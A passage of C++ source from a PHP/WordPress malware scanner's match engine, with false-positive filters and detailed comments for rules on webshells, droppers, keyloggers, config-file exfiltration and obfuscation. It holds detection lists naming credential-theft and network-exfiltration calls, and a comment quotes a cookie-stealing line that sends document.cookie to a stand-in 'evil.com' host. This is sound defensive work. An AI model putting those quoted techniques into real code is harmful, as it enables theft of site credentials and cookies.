#include "MatchEngine.h"
#include "utils/SafeText.h"
#include "analysis/StringAssembly.h"
#include <algorithm>
#include <cctype>
#include <vector>

namespace lyxbosa {

// Suppression comment patterns to detect
static const std::vector<std::string> suppressionPatterns = {
    "phpcs:ignore",
    "phpcs:disable",
    "@codingStandardsIgnore",
    "// noqa",
    "# noqa",
    "/* noqa",
    "// nolint",
    "// NOSONAR",
    "@SuppressWarnings",
    "// @ts-ignore",
    "// eslint-disable",
    "/* eslint-disable",
};

// Check if a line contains a suppression comment
static bool lineContainsSuppression(std::string_view line) {
    for (const auto& pattern : suppressionPatterns) {
        if (line.find(pattern) != std::string_view::npos) {
            return true;
        }
    }
    return false;
}

// Get the line containing the given offset
static std::string_view getLineAt(std::string_view content, size_t offset) {
    // Find line start
    size_t lineStart = content.rfind('\n', offset > 0 ? offset - 1 : 0);
    lineStart = (lineStart == std::string_view::npos) ? 0 : lineStart + 1;

    // Find line end
    size_t lineEnd = content.find('\n', offset);
    if (lineEnd == std::string_view::npos) {
        lineEnd = content.size();
    }

    return content.substr(lineStart, lineEnd - lineStart);
}

// ============================================================================
// Context-aware filtering for false-positive reduction
// ============================================================================

// Public static wrapper for getLineAt
std::string_view MatchEngine::getLineAtOffset(std::string_view content, size_t offset) {
    return getLineAt(content, offset);
}

// Check if a position is inside a PHP/JS block comment or docblock
bool MatchEngine::isInComment(std::string_view content, size_t offset) {
    // Look backwards for /* without matching */
    // And check if current line starts with * (docblock continuation)

    // Find the current line
    std::string_view line = getLineAt(content, offset);

    // Check if line starts with * (docblock line) or //
    size_t firstNonSpace = line.find_first_not_of(" \t");
    if (firstNonSpace != std::string_view::npos) {
        if (line[firstNonSpace] == '*') {
            return true;  // Docblock continuation line
        }
        if (line.size() > firstNonSpace + 1 &&
            line[firstNonSpace] == '/' && line[firstNonSpace + 1] == '/') {
            return true;  // Single-line comment
        }
    }

    // Check for block comment /* ... */ by scanning backwards
    size_t lastOpen = content.rfind("/*", offset);
    if (lastOpen != std::string_view::npos) {
        size_t closingAfterOpen = content.find("*/", lastOpen);
        if (closingAfterOpen == std::string_view::npos || closingAfterOpen > offset) {
            return true;  // Inside block comment
        }
    }

    return false;
}

// Check if position appears to be inside a SQL query (heuristic)
bool MatchEngine::isInSqlQuery(std::string_view content, size_t offset) {
    // Look for SQL keywords nearby (within ~200 chars before)
    size_t start = (offset > 200) ? offset - 200 : 0;
    std::string_view context = content.substr(start, offset - start);

    // SQL indicators
    static const std::vector<std::string_view> sqlIndicators = {
        "SELECT ", "INSERT ", "UPDATE ", "DELETE ", "FROM ",
        "WHERE ", "JOIN ", "ORDER BY", "GROUP BY", "CREATE TABLE",
        "$wpdb->", "mysql_query", "mysqli_query", "->query(",
    };

    for (const auto& indicator : sqlIndicators) {
        if (context.find(indicator) != std::string_view::npos) {
            return true;
        }
    }

    return false;
}

// The body of the quoted string literal a match opens, e.g. the argument of
// `eval("var x = ...")`. Returns an empty view when the match does not open one.
//
// Scans forward from the match for the first quote, then to its unescaped partner.
// Bounded by maxLen: a rule asks this to look at what is being evaluated, not to walk
// a whole minified bundle when the closing quote is missing.
static std::string_view quotedLiteralAt(std::string_view content, size_t offset, size_t maxLen) {
    if (offset >= content.size()) return {};

    // The quote is inside the matched text - a few bytes in, after `eval(` and any space.
    const size_t searchEnd = std::min(offset + 32, content.size());
    size_t open = std::string_view::npos;
    for (size_t i = offset; i < searchEnd; ++i) {
        if (content[i] == '"' || content[i] == '\'') { open = i; break; }
    }
    if (open == std::string_view::npos) return {};

    const char quote = content[open];
    const size_t limit = std::min(open + 1 + maxLen, content.size());
    for (size_t i = open + 1; i < limit; ++i) {
        if (content[i] == '\\') { ++i; continue; }
        if (content[i] == quote) return content.substr(open + 1, i - open - 1);
    }
    return content.substr(open + 1, limit - open - 1);
}

// Lowercased trailing extension of a path, including the dot ("" when there is none).
static std::string lowerExtension(std::string_view filePath) {
    std::string path(filePath);
    std::transform(path.begin(), path.end(), path.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    const auto dot = path.find_last_of("./\\");
    if (dot == std::string::npos || path[dot] != '.') return {};
    return path.substr(dot);
}

// Whether a file's type means the webserver serves it as data rather than executing it.
// A `.php` is code; a `.html`, `.json` or `.log` is a document, and PHP or shell source
// quoted inside one is a *record of* code, not code that runs.
static bool isNonExecutableDataFile(std::string_view filePath) {
    static constexpr std::string_view kDataExtensions[] = {
        ".html", ".htm", ".xhtml", ".json", ".log", ".csv", ".tsv", ".xml", ".txt", ".md",
    };
    const std::string ext = lowerExtension(filePath);
    for (auto candidate : kDataExtensions) {
        if (ext == candidate) return true;
    }
    return false;
}

// Whether a match sits inside a JSON string *value* - i.e. the nearest unescaped quote
// before it opens a string that a `:` introduced.
//
// This is what an access-log viewer, WAF dashboard or exported request table looks like:
// the attack payload is the content of a `"data": "..."` field. Bounded backward scan,
// because these documents are written as a single enormous line.
static bool insideJsonStringValue(std::string_view content, size_t offset) {
    if (offset == 0 || offset > content.size()) return false;

    constexpr size_t kMaxLookback = 8192;
    const size_t start = (offset > kMaxLookback) ? offset - kMaxLookback : 0;

    for (size_t i = offset; i-- > start;) {
        if (content[i] != '"') continue;

        // A quote is escaped when an odd number of backslashes precedes it.
        size_t backslashes = 0;
        for (size_t j = i; j-- > start && content[j] == '\\';) ++backslashes;
        if (backslashes % 2 == 1) continue;

        // Nearest unescaped quote found: is it a value's opening quote?
        size_t k = i;
        while (k-- > start && (content[k] == ' ' || content[k] == '\t')) {}
        return k >= start && k < content.size() && content[k] == ':';
    }
    return false;
}

// Whether a run of numbers rises monotonically - which is what makes it a *table* rather
// than a payload.
//
// A byte table enumerates the character set in order: Symfony's intl-normalizer writes
// `"\0\1\2\3\4\5\6\7\10\v\f\r\16\17\20...\37"` as its ASCII sort key, and phpinsight builds
// its codepoint map as `chr(192) . chr(193) . chr(194) . ...`. An encoded payload spells out
// arbitrary bytes, so its values do not ascend. Needs at least `minRun` values to conclude
// anything - two ascending numbers are a coincidence.
static bool isAscendingNumericRun(const std::vector<long>& values, size_t minRun) {
    if (values.size() < minRun) return false;
    for (size_t i = 1; i < values.size(); ++i) {
        if (values[i] <= values[i - 1]) return false;
    }
    return true;
}

// Numeric values of the `\NNN` octal escapes in `text`, in order.
static std::vector<long> octalEscapeValues(std::string_view text) {
    std::vector<long> values;
    for (size_t i = 0; i + 1 < text.size(); ++i) {
        if (text[i] != '\\' || text[i + 1] < '0' || text[i + 1] > '7') continue;
        size_t j = i + 1;
        long value = 0;
        while (j < text.size() && j <= i + 3 && text[j] >= '0' && text[j] <= '7') {
            value = value * 8 + (text[j] - '0');
            ++j;
        }
        values.push_back(value);
        i = j - 1;
    }
    return values;
}

// Numeric arguments of the `chr(N)` calls in `text`, in order.
static std::vector<long> chrArgumentValues(std::string_view text) {
    std::vector<long> values;
    size_t pos = 0;
    while ((pos = text.find("chr", pos)) != std::string_view::npos) {
        size_t i = pos + 3;
        while (i < text.size() && (text[i] == ' ' || text[i] == '\t')) ++i;
        if (i >= text.size() || text[i] != '(') { pos += 3; continue; }
        ++i;
        while (i < text.size() && (text[i] == ' ' || text[i] == '\t')) ++i;
        long value = 0;
        bool anyDigit = false;
        while (i < text.size() && text[i] >= '0' && text[i] <= '9') {
            value = value * 10 + (text[i] - '0');
            anyDigit = true;
            ++i;
        }
        if (anyDigit) values.push_back(value);
        pos = i;
    }
    return values;
}

// Apply context-aware filter for specific rules
// Returns true if match should be kept, false to discard (false positive)
bool MatchEngine::applyContextFilter(const std::string& ruleCode, const MatchContext& ctx) {
    // ------------------------------------------------------------------
    // Family-wide: code-execution evidence quoted inside a data document.
    //
    // `cwp_stats/goaccess/*.html` are GoAccess traffic reports. They embed the whole
    // request table as JSON, so every attack URL the site was ever probed with is in
    // them verbatim - `"data": "/?up-time=eval(base64_decode(...));"`. The scanner was
    // matching a log of somebody else's attack and calling it a webshell: 151 findings
    // across eight rules on one production host, none of them code.
    //
    // Both conditions are required, and together they are narrow: the file must be a type
    // the webserver serves rather than executes, *and* the match must be the content of a
    // serialised field. A `.php` webshell is untouched by this whatever it contains.
    if (isNonExecutableDataFile(ctx.filePath)) {
        static constexpr std::string_view kExecutionFamilies[] = {"RCE", "WS", "DRP", "EXP", "BD"};
        for (auto family : kExecutionFamilies) {
            if (ruleCode.compare(0, family.size(), family) == 0 &&
                insideJsonStringValue(ctx.content, ctx.matchOffset)) {
                return false;
            }
        }
    }

    // RCE009: Backtick command execution - DISABLED
    // This rule is fundamentally broken because:
    // 1. PHP/WordPress uses backticks in docblocks for inline code examples
    // 2. The pattern matches across lines, catching backticks in comments
    //    that are hundreds of lines before the actual $_GET/$_POST
    // 3. SQL uses backticks for table/column names
    // 4. Real malware uses shell_exec/system/exec instead of backticks
    // Result: ~100% false positive rate on legitimate CMS code
    if (ruleCode == "RCE009") {
        return false;  // Always filter out - rule is too broken
    }

    // SEO001: Hidden link injection
    // A markup rule. JavaScript that *builds* markup - slider and page-builder
    // bundles emit '<a style="display:none" href="http...">' as a template string -
    // is not an injected spam link, and matching it cost 2 false positives on a
    // real site after the rule was repaired.
    if (ruleCode == "SEO001") {
        std::string path(ctx.filePath);
        std::transform(path.begin(), path.end(), path.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        if (path.size() >= 3 && path.compare(path.size() - 3, 3, ".js") == 0) {
            return false;
        }
    }

    // DEFC006: JavaScript eval dynamic code
    //
    // webpack's `devtool: 'eval'` and `'eval-source-map'` wrap *every module* in
    // `eval("var ...")`, so one shipped development bundle produces dozens of hits - 141
    // findings on one host, from six plugins plus WordPress core's own
    // `react-refresh-entry.js`.
    //
    // The evidence is inside the evaluated string itself: webpack writes its module
    // plumbing (`__webpack_require__`), its `/*! ... */` request comments, and a
    // `//# sourceURL=webpack:///` footer into the very text being evaluated. Taking the
    // test from the literal rather than from the package path covers every bundler
    // output, including plugins not yet written.
    if (ruleCode == "DEFC006") {
        static constexpr std::string_view kBundlerMarkers[] = {
            "__webpack_require__", "sourceURL=webpack", "webpack:///", "/*! ",
        };
        // 64 KB is well past the largest module literal measured (29 KB) and still bounded.
        const std::string_view evaluated = quotedLiteralAt(ctx.content, ctx.matchOffset, 64 * 1024);
        for (auto marker : kBundlerMarkers) {
            if (evaluated.find(marker) != std::string_view::npos) {
                return false;
            }
        }
        return true;
    }

    // DRP002: Download and execute
    //
    // The pattern is the composer installation one-liner, which appears as *documentation*
    // far more often than as an attack: composer-installers prints it in its "you did not
    // install this with composer" error, and every PHP Dockerfile in existence runs it.
    // 74 of 79 false positives on one host were one of four well-known installer URLs.
    //
    // DRP001 already carries a legitimateDomains list for exactly this reason; DRP002 was
    // simply never given one. A real dropper pipes from a host no whitelist would carry -
    // the two true positives on that host fetched `https://gsocket.io/x`.
    if (ruleCode == "DRP002") {
        static constexpr std::string_view kInstallerDomains[] = {
            "getcomposer.org",
            "raw.githubusercontent.com",
            "get.symfony.com",
            "cygwin.com",
            "sh.rustup.rs",
            "deb.nodesource.com",
            "rpm.nodesource.com",
            "install.python-poetry.org",
        };
        for (auto domain : kInstallerDomains) {
            if (ctx.matchedText.find(domain) != std::string_view::npos) {
                return false;
            }
        }
        return true;
    }

    // BD004: Config file reader
    //
    // Reading wp-config.php is not exfiltration - it is what every caching plugin does to
    // add the WP_CACHE constant. WP Fastest Cache alone accounted for all 43 findings on
    // one host, and the rule had no true positive anywhere in 1.3 M files.
    //
    // What makes reading a config a finding is where the contents go next. Note that
    // `file_put_contents` is deliberately *not* an exfiltration signal: writing the config
    // back is precisely the legitimate case (WP Fastest Cache's next statement is a
    // str_replace and a write to the same path). The signals below all move the credentials
    // somewhere the config never went - out over the network, into mail, into an encoding
    // for transport, or through a regex that picks the database password out by name.
    if (ruleCode == "BD004") {
        static constexpr std::string_view kExfiltrationSignals[] = {
            "DB_PASSWORD", "DB_USER", "DB_NAME", "DB_HOST",
            "mail(", "wp_mail(",
            "curl_setopt", "curl_exec", "fsockopen", "stream_socket_client",
            "base64_encode", "gzcompress", "gzdeflate", "http_build_query",
            "file_get_contents(\"http", "file_get_contents('http",
        };
        const size_t searchEnd = std::min(ctx.matchOffset + 400, ctx.content.size());
        const std::string_view afterMatch =
            ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);
        for (auto signal : kExfiltrationSignals) {
            if (afterMatch.find(signal) != std::string_view::npos) {
                return true;
            }
        }
        return false;
    }

    // OBF036: Binary payload in text file
    // Only meaningful for files whose type *declares* them to be source text. The scan
    // filter deliberately admits images, fonts, archives and video (payloads hide there),
    // and those are binary by definition - measuring control bytes in a .ttf says nothing.
    if (ruleCode == "OBF036") {
        static constexpr std::string_view kTextExtensions[] = {
            ".php", ".php0", ".php1", ".php2", ".php3", ".php4", ".php5", ".php6",
            ".php7", ".php8", ".phps", ".pht", ".phtm", ".phtml", ".inc", ".tpl",
            ".ctp", ".module", ".install", ".engine", ".theme", ".profile",
            ".js", ".mjs", ".cjs", ".jsx", ".ts", ".vue",
            ".html", ".htm", ".xhtml", ".shtml", ".css", ".svg",
            ".xml", ".json", ".yml", ".yaml", ".ini", ".conf", ".cfg", ".env",
            ".txt", ".log", ".md", ".htaccess", ".htpasswd",
            ".pl", ".pm", ".py", ".rb", ".sh", ".bash", ".ksh", ".zsh", ".lua", ".cgi",
            ".c", ".cpp", ".h", ".asp", ".aspx", ".ashx", ".asmx", ".jsp", ".jspx",
            ".cfm", ".ps1", ".bat",
        };

        // Compare against the lowercased trailing extension only.
        std::string path(ctx.filePath);
        std::transform(path.begin(), path.end(), path.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });

        auto dot = path.find_last_of("./\\");
        bool isText = false;
        if (dot != std::string::npos && path[dot] == '.') {
            std::string_view ext(path.data() + dot, path.size() - dot);
            for (auto candidate : kTextExtensions) {
                if (ext == candidate) { isText = true; break; }
            }
        }
        if (!isText) {
            return false;
        }

        // Wordfence stores its WAF state as binary inside .php files guarded by an
        // exit header. Real, common, and not malware.
        if (path.find("/wflogs/") != std::string::npos ||
            path.find("\\wflogs\\") != std::string::npos) {
            return false;
        }

        // .sql dumps legitimately carry BLOB literals.
        if (path.size() >= 4 && path.compare(path.size() - 4, 4, ".sql") == 0) {
            return false;
        }

        // macOS AppleDouble resource-fork stub. Unpacking a theme zip authored on a Mac
        // leaves a `._name.php` beside every `name.php`; it inherits the .php suffix but
        // is not PHP at all, it is the metadata half of the original file. Keyed on the
        // four-byte magic rather than on `__MACOSX/`, so it still holds for a stub that
        // was unpacked outside that directory.
        if (ctx.content.size() >= 4 &&
            static_cast<unsigned char>(ctx.content[0]) == 0x00 &&
            static_cast<unsigned char>(ctx.content[1]) == 0x05 &&
            static_cast<unsigned char>(ctx.content[2]) == 0x16 &&
            static_cast<unsigned char>(ctx.content[3]) == 0x07) {
            return false;
        }

        // Generated protobuf metadata. `protoc --php_out` emits the serialised
        // FileDescriptorProto as a single-quoted PHP string, so a GPBMetadata class is
        // legitimately half control bytes. This is by far the largest single source of
        // OBF036 noise on a host that runs any Google plugin (Ads, Site Kit, Listings).
        //
        // Both tests read the file's own declaration rather than its path, so they hold
        // for the vendored copies that rename `vendor/` to `third-party/`.
        {
            const std::string_view head = ctx.content.substr(0, std::min<size_t>(ctx.content.size(), 512));
            if (head.find("Generated by the protocol buffer compiler") != std::string_view::npos ||
                head.find("namespace GPBMetadata") != std::string_view::npos) {
                return false;
            }
        }

        return true;
    }

    // DEFC002: Index file replacement
    //
    // Writing an index file is how a plugin *protects* a directory, and that is the
    // opposite of defacement. Unyson's backup module writes an index.php holding
    // `header('HTTP/1.0 403 Forbidden'); die('<h1>Forbidden</h1>');`, and Amelia
    // writes an empty index.html - both so the directory cannot be listed.
    //
    // A defacer replaces index.php with a page. A guard stub denies access or is
    // empty, and says so in the bytes being written.
    if (ruleCode == "DEFC002") {
        // The content is usually assembled just above the write and passed as a
        // variable, so the window has to look backwards as well as forwards.
        const size_t start = (ctx.matchOffset > 400) ? ctx.matchOffset - 400 : 0;
        const size_t end = std::min(ctx.matchOffset + 400, ctx.content.size());
        const std::string_view around = ctx.content.substr(start, end - start);

        static constexpr std::string_view kGuardMarkers[] = {
            "403 Forbidden", "Forbidden", "Deny from all", "deny from all",
            "Options -Indexes", "Silence is golden", "HTTP/1.0 403", "R=404",
        };
        for (auto marker : kGuardMarkers) {
            if (around.find(marker) != std::string_view::npos) {
                return false;
            }
        }

        // An empty file cannot deface anything.
        const std::string_view afterMatch =
            ctx.content.substr(ctx.matchOffset, end - ctx.matchOffset);
        if (afterMatch.find(", '')") != std::string_view::npos ||
            afterMatch.find(", \"\")") != std::string_view::npos ||
            afterMatch.find(",'')") != std::string_view::npos ||
            afterMatch.find(",\"\")") != std::string_view::npos) {
            return false;
        }

        return true;
    }

    // BD008: htaccess backdoor
    //
    // The technique is an .htaccess that makes something *executable* - mapping an
    // innocuous extension to the PHP handler so an uploaded .jpg runs as code. Merely
    // writing an .htaccess is what every plugin does to protect its own directories.
    //
    // Note that `RewriteRule` is not an enabling directive, despite looking like one:
    // unyson's backup guard is `Deny from all` followed by
    // `RewriteRule . - [R=404,L]`, which is a rewrite that denies. The enabling
    // directives are the ones that attach a handler.
    if (ruleCode == "BD008") {
        const size_t start = (ctx.matchOffset > 400) ? ctx.matchOffset - 400 : 0;
        const size_t end = std::min(ctx.matchOffset + 400, ctx.content.size());
        const std::string_view around = ctx.content.substr(start, end - start);

        static constexpr std::string_view kEnablingDirectives[] = {
            "AddType", "AddHandler", "SetHandler", "ForceType",
            "php_flag engine", "php_value", "php_admin_value", "Action ",
            "x-httpd-php", "application/x-httpd",
        };
        for (auto directive : kEnablingDirectives) {
            if (around.find(directive) != std::string_view::npos) {
                return true;
            }
        }
        return false;
    }

    // BD013: Embedded private key
    //
    // The rule wants a key a backdoor uses to talk to its C2. What it found on a production
    // host was documentation: Twilio's SDK spells out the APNs credential format in a
    // docblock, `e.g. \`-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEAuyf/...\``, and
    // google/apiclient ships a test fixture key. 10 findings, no C2.
    //
    // isInComment() has existed since the first context filters and was simply never wired
    // to this rule.
    if (ruleCode == "BD013") {
        if (isInComment(ctx.content, ctx.matchOffset)) {
            return false;  // Documentation, not a key in use
        }

        std::string path(ctx.filePath);
        std::transform(path.begin(), path.end(), path.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });

        // Fixture keys are generated to be published; that is what makes them fixtures.
        static constexpr std::string_view kFixturePaths[] = {
            "/tests/", "/test/", "testdata", "/fixtures/", "/fixture/",
        };
        for (auto fragment : kFixturePaths) {
            if (path.find(fragment) != std::string::npos) {
                return false;
            }
        }

        // A private key inside ~/.ssh is a private key where private keys belong. Worth an
        // operator's attention as hygiene, but it is not an embedded C2 credential, which is
        // what this rule reports at critical.
        if (path.find("/.ssh/") != std::string::npos) {
            return false;
        }

        return true;
    }

    // BD010: Auto-update manipulation
    //
    // Zero true positives in 1.3 M files. `add_filter('auto_update_...')` is the documented
    // WordPress API for opting a plugin in or out of its own updates, and WooCommerce,
    // MonsterInsights, Cookiebot, LearnPress, LiteSpeed Cache and AIOSEO all call it. 14 of
    // the 47 findings were not code at all - WPCode caches its snippet library as JSON that
    // happens to contain the string - and one was a commented-out line.
    //
    // Malware that wants to stop updates overwrites wp-includes/update.php or sets
    // WP_AUTO_UPDATE_CORE; it does not politely register a filter. The rule is kept only as
    // a corroborator, narrowed to the one form that means *disabling* rather than managing,
    // and demoted to Low - see the severity on the rule itself.
    if (ruleCode == "BD010") {
        if (isInComment(ctx.content, ctx.matchOffset)) {
            return false;
        }
        // A JSON snippet library or a .txt readme is data quoting the API, not a call to it.
        const std::string ext = lowerExtension(ctx.filePath);
        static constexpr std::string_view kPhpExtensions[] = {
            ".php", ".phtml", ".inc", ".module", ".install", ".theme", ".profile", ".engine",
        };
        bool isPhp = false;
        for (auto candidate : kPhpExtensions) {
            if (ext == candidate) { isPhp = true; break; }
        }
        if (!isPhp) return false;

        return true;
    }

    // CRED004: Keylogger injection (addEventListener keydown)
    // False positives: Legitimate keyboard event handling in web apps
    // Only flag if: keydown handler appears to capture and store/send key data
    if (ruleCode == "CRED004") {
        // Look for patterns that indicate actual keylogging behavior:
        // 1. Capturing key codes/characters and storing them
        // 2. Sending captured data to external servers

        // Strong indicators of keylogger behavior (within ~500 chars of keydown)
        static const std::vector<std::string_view> keylogIndicators = {
            "String.fromCharCode",  // Converting to character (common in keyloggers)
            "keyBuffer",            // Common keylogger variable name
            "keyLog",               // Common keylogger variable name
            "loggedKeys",           // Common keylogger variable name
            "keys +=",              // Accumulating keys
            "capturedKeys",         // Capturing terminology
        };

        // Check within ~500 chars after the keydown listener for keylog behavior
        size_t searchEnd = std::min(ctx.matchOffset + 500, ctx.content.size());
        std::string_view afterMatch = ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);

        bool hasKeylogBehavior = false;
        for (const auto& indicator : keylogIndicators) {
            if (afterMatch.find(indicator) != std::string_view::npos) {
                hasKeylogBehavior = true;
                break;
            }
        }

        // Also check for data exfiltration patterns in the handler context
        if (!hasKeylogBehavior) {
            // Check if there's both key capture AND external send nearby
            bool capturesKey = afterMatch.find("String.fromCharCode") != std::string_view::npos ||
                              (afterMatch.find("event.key") != std::string_view::npos &&
                               afterMatch.find("+=") != std::string_view::npos);

            bool sendsData = afterMatch.find("new Image(") != std::string_view::npos ||
                            afterMatch.find(".src =") != std::string_view::npos ||
                            afterMatch.find("send(") != std::string_view::npos;

            hasKeylogBehavior = capturesKey && sendsData;
        }

        return hasKeylogBehavior;
    }

    // PHI003: Cookie stealing - DISABLED
    // This rule is fundamentally broken because the pattern
    // `document.cookie.*?(location|window.open|fetch|XMLHttpRequest)` matches:
    // 1. document.cookie ANYWHERE in file
    // 2. Plus ANY mention of location/fetch/etc ANYWHERE after it
    //
    // This catches legitimate code like WordPress post.js which:
    // - Uses document.cookie for legitimate cookie management
    // - Also uses window.location.href to get current URL (unrelated)
    //
    // Real cookie stealing looks like: new Image().src = 'evil.com?' + document.cookie
    // But that specific pattern is hard to detect without false positives.
    // Better to rely on other indicators (obfuscation, eval, etc.)
    if (ruleCode == "PHI003") {
        return false;  // Always filter out - pattern is too broad
    }

    // BD005: Socket-based backdoor
    // False positives: Legitimate FTP/socket classes in CMS, logging libraries (Monolog)
    // The pattern socket_create...socket_connect is used by WordPress's class-ftp-sockets.php
    // Monolog's CubeHandler uses socket_create for UDP logging to Cube analytics
    // Only flag if context suggests malicious use
    if (ruleCode == "BD005") {
        // Check if this is a legitimate FTP/socket/logging utility file
        static const std::vector<std::string_view> legitimatePaths = {
            "ftp",
            "socket",
            "class-ftp",
            "FTP",
            "Socket",
            "monolog",               // Monolog logging library
            "Monolog",
            "vendor-prefixed",       // CMS vendor-prefixed libraries
            "Handler.php",           // Logging handlers (CubeHandler, SocketHandler, etc.)
            "Guzzle",               // HTTP client library
        };

        // Check file path
        for (const auto& name : legitimatePaths) {
            if (ctx.filePath.find(name) != std::string_view::npos) {
                return false;  // Skip - legitimate library
            }
        }

        // Check for FTP/logging-related context on the matched line
        std::string_view line = getLineAtOffset(ctx.content, ctx.matchOffset);
        if (line.find("ftp") != std::string_view::npos ||
            line.find("FTP") != std::string_view::npos ||
            line.find("_connect") != std::string_view::npos ||
            line.find("_data_") != std::string_view::npos ||
            line.find("SOCK_DGRAM") != std::string_view::npos ||   // UDP socket (logging)
            line.find("udp") != std::string_view::npos ||
            line.find("UDP") != std::string_view::npos) {
            return false;  // Skip - FTP/logging context
        }

        return true;  // Keep - suspicious socket usage
    }

    // WS006: FilesMan webshell
    // False positives: Magento test files that contain "FilesMan" in method names
    // Only flag if context suggests actual webshell behavior
    if (ruleCode == "WS006") {
        // Skip if this is a test file
        if (ctx.filePath.find("/tests/") != std::string_view::npos ||
            ctx.filePath.find("/test/") != std::string_view::npos ||
            ctx.filePath.find("_test.php") != std::string_view::npos ||
            ctx.filePath.find("Test.php") != std::string_view::npos) {
            return false;  // Skip - test file
        }

        return true;  // Keep the match
    }

    // DEFC001: Hacker signature
    // "hacked by <word>" also occurs in ordinary English prose - security plugin
    // readmes talk about "getting hacked by identifying malicious traffic". A real
    // defacement signature names a handle, it does not continue into a sentence.
    if (ruleCode == "DEFC001") {
        static constexpr std::string_view kProseFollowers[] = {
            "identifying", "exploiting", "using", "the", "a", "an", "attackers",
            "hackers", "malicious", "someone", "anyone", "this", "these", "those",
            "scanning", "checking", "blocking", "monitoring", "default",
        };

        // Take the word that follows "by" in the matched text.
        std::string matched(ctx.matchedText);
        std::transform(matched.begin(), matched.end(), matched.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        auto byPos = matched.rfind(" by ");
        if (byPos != std::string::npos) {
            std::string_view handle(matched);
            handle.remove_prefix(byPos + 4);
            for (auto word : kProseFollowers) {
                if (handle == word) {
                    return false;
                }
            }
        }
        return true;
    }

    // OBF002: chr() string building
    // False positives: Legitimate use in doctrine/inflector for character ranges
    if (ruleCode == "OBF002") {
        // A codepoint table, not a hidden string. phpinsight's sentiment analyser writes its
        // high-byte map as `chr(192) . chr(193) . chr(194) . ...`; the path-based vendor skip
        // never saw it, because it is vendored as
        // `plugins/*/includes/**/phpinsight/lib/PHPInsight/Sentiment.php`. Reading the values
        // is what generalises - no allow-list can keep up with where a library gets copied.
        // Three is enough here: the pattern already required four chained chr() calls to
        // match at all, and the matched text ends on the fourth `chr` before its argument.
        if (isAscendingNumericRun(chrArgumentValues(ctx.matchedText), 3)) {
            return false;
        }

        // Skip in vendor directories - third-party libraries
        if (ctx.filePath.find("/vendor/") != std::string_view::npos) {
            return false;  // Skip - vendor library
        }

        // Skip in test files
        if (ctx.filePath.find("/tests/") != std::string_view::npos ||
            ctx.filePath.find("/test/") != std::string_view::npos) {
            return false;  // Skip - test file
        }

        return true;
    }

    // OBF016: Octal-encoded strings
    //
    // Same reasoning as OBF002: an ascending run is a table. Symfony's intl-normalizer
    // polyfill ends its `$ASCII` sort key with `\0\1\2...\37`, which is 18 consecutive
    // two-digit octal escapes and matched the rule's `{8,}` run requirement.
    if (ruleCode == "OBF016") {
        if (isAscendingNumericRun(octalEscapeValues(ctx.matchedText), 8)) {
            return false;
        }
        return true;
    }

    // OBF009: Nested base64 decoding
    //
    // Double-encoding is a real transport habit, not necessarily an obfuscation: Kirki
    // passes form metadata as `explode('|', base64_decode(base64_decode($x)))` and
    // OptinMonster debug-dumps its rules the same way. What matters is whether the result is
    // *executed* or parsed - the same consumer test OBF010 already applies.
    if (ruleCode == "OBF009") {
        const size_t searchEnd = std::min(ctx.matchOffset + 300, ctx.content.size());
        const std::string_view nearby =
            ctx.content.substr(ctx.matchOffset, searchEnd - ctx.matchOffset);

        // An execution consumer keeps the finding whatever else is around it.
        static constexpr std::string_view kExecutionConsumers[] = {
            "eval", "assert(", "create_function", "preg_replace", "include", "require",
        };
        for (auto consumer : kExecutionConsumers) {
            if (nearby.find(consumer) != std::string_view::npos) {
                return true;
            }
        }

        // Nothing executes the result, so there is no finding. Double-encoding on its
        // own is a transport habit, not an attack: Kirki passes form metadata this way,
        // and OptinMonster double-decodes a value only to compare it against an API key.
        // Enumerating the benign consumers was the wrong way round - there is no end to
        // them - so the rule asks for the one thing that makes decoding dangerous.
        return false;
    }

    // OBF021: Double variable function call
    //
    // `$a($b)` in a docblock is prose about an API, not a call: click-to-chat's animation
    // helper documents itself with `* $a($a) - it like calling bounce('bounce')`. And a
    // single `return (bool) $b($a);` in a comparer class is ordinary short-parameter code -
    // real webshells use the construct repeatedly, or on data they took from the request.
    if (ruleCode == "OBF021") {
        if (isInComment(ctx.content, ctx.matchOffset)) {
            return false;
        }

        // Corroboration: either the construct recurs, or a superglobal feeds it.
        //
        // Counts the rule's own shape, `$a($b)` with one-or-two-character names, by looking
        // only at the bytes around each '$' - no search that could rescan the file.
        auto isShortVariable = [](std::string_view s, size_t& i) {
            if (i >= s.size() || s[i] != '$') return false;
            size_t j = i + 1;
            if (j >= s.size() || !std::isalpha(static_cast<unsigned char>(s[j]))) return false;
            ++j;
            if (j < s.size() && std::isdigit(static_cast<unsigned char>(s[j]))) ++j;
            i = j;
            return true;
        };
        size_t occurrences = 0;
        for (size_t i = 0; i < ctx.content.size() && occurrences < 2; ++i) {
            if (ctx.content[i] != '$') continue;
            size_t p = i;
            if (!isShortVariable(ctx.content, p)) continue;
            while (p < ctx.content.size() && (ctx.content[p] == ' ' || ctx.content[p] == '\t')) ++p;
            if (p >= ctx.content.size() || ctx.content[p] != '(') continue;
            ++p;
            while (p < ctx.content.size() && (ctx.content[p] == ' ' || ctx.content[p] == '\t')) ++p;
            if (!isShortVariable(ctx.content, p)) continue;
            while (p < ctx.content.size() && (ctx.content[p] == ' ' || ctx.content[p] == '\t')) ++p;
            if (p < ctx.content.size() && ctx.content[p] == ')') ++occurrences;
        }
        if (occurrences >= 2) return true;

        static constexpr std::string_view kSuperglobals[] = {
            "$_GET", "$_POST", "$_REQUEST", "$_COOKIE", "$_SERVER", "$_FILES", "php://input",
        };
        for (auto superglobal : kSuperglobals) {
            if (ctx.content.find(superglobal) != std::string_view::npos) {
                return true;
            }
        }

        return false;
    }

    // BD001: Hidden admin creation
    //
    // A `.sql` dump is a record of rows, not code that inserts them - it cannot execute, so
    // `INSERT INTO wp_users ... admin` in one is the site's own user table, backed up.
    if (ruleCode == "BD001") {
        const std::string ext = lowerExtension(ctx.filePath);
        if (ext == ".sql" || ext == ".gz" || ext == ".bz2" || ext == ".dump") {
            return false;
        }
        return true;
    }

    // DRP008: Archive dropper
    //
    // Writing a zip is only dropper behaviour when the attacker chose what goes in it or
